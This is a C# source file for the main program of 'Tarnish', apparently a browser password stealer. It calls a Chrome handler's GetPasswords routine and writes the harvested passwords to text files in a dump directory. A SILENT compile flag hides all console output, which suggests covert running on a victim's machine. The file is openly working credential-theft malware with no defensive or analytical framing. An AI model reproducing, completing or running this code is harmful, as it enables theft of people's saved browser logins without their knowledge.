#define SILENT
using System;
using System.IO;

namespace Tarnish
{
    class Program
    {
        static Proc[] Processes = new Proc[] 
        { 
            new ProcChrome()
        };
        static void Main(string[] args)
        {
            if (!Directory.Exists(Global.DumpDir))
                Directory.CreateDirectory(Global.DumpDir);
            if (!Config.Silent)
            {
                Console.WriteLine("Tarnish " + Global.AssemName.Version.ToString());
            }
            foreach (Proc proc in Processes)
            {
                if (!Config.Silent)
                {
                    Console.WriteLine(proc.Name);
                    Console.ForegroundColor = ConsoleColor.Gray;
                }
                string pws = proc.GetPasswords();
                if (pws != "")
                {
                    using (StreamWriter sw = new StreamWriter(Global.DumpDir + proc.Name + ".txt"))
                        sw.Write(pws);
                    if (!Config.Silent)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("OKAY!");
                    }
                }
                else if (!Config.Silent)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("FAIL!");
                }
            }
        }
    }
}